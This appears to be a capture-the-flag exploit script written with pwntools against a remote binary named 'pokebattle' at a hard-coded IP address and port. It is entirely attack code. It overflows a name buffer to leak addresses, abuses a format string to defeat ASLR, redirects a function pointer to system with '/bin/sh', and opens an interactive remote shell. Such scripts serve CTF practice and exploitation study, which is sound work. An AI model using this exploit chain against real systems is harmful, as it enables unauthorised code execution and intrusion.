from pwn import *
rhp = {'host': '114.177.250.4', 'port': 2225}
conn = remote(rhp['host'], rhp['port'])

binf = ELF('pokebattle')
# libc = ELF('libc.so.6.local')
libc = ELF('libc.so.6')

# conn = process('pokebattle')
# gdb.attach(conn)


def fight():
    conn.recvuntil('> ')
    conn.sendline('1')
    res = conn.recvline(False).ljust(8, b'\x00')
    return res


def pokeball(slot, name):
    conn.recvuntil('> ')
    conn.sendline('2')
    conn.recvuntil('slot : ')
    conn.sendline(str(slot))
    conn.recvuntil('name : ')
    conn.sendline(name)


def pokemons(slot):
    conn.recvuntil('> ')
    conn.sendline('4')
    conn.recvline()
    conn.recvline()
    res = conn.recvuntil(' /HP')[:-4].ljust(8, b'\x00')
    conn.recvuntil('Select Pokemon : ')
    conn.sendline(str(slot))
    return res


pokeball(0, 'a' * 39)  # 'a' * 39 + '\n' = 40
kick_addr = u64(pokemons(0))
binf_base = kick_addr - binf.symbols[b'kick']
log.info("binf_base: " + hex(binf_base))

payload = b'%75$p\n'  # __libc_start_main - 240
payload = payload.ljust(40, b'\x00')
payload += p64(binf_base + binf.plt[b'printf'])

pokeball(0, payload)
pokemons(0)

libc_base = int(fight(), 16) - 231 - libc.symbols[b'__libc_start_main']
log.info("libc_base: " + hex(libc_base))

payload = b'/bin/sh'.ljust(40, b'\x00') + \
    p64(libc_base + libc.symbols[b'system'])
pokeball(0, payload)

pokemons(0)
conn.recvuntil('> ')
conn.sendline('1')

conn.interactive()
